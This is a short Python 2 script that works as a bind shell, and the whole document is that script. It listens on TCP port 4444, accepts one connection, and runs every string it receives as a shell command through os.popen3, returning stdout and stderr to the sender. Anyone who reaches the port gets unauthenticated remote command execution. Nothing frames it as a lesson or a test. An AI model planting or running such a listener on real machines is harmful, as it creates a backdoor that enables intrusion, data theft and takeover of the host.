import socket,os
so=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
so.bind(('',4444))
so.listen(1)
so,addr=so.accept()
ZM=False
while not ZM:
	data=so.recv(1024)
	stdin,stdout,stderr,=os.popen3(data)
	stdout_value=stdout.read()+stderr.read()
	so.send(stdout_value)
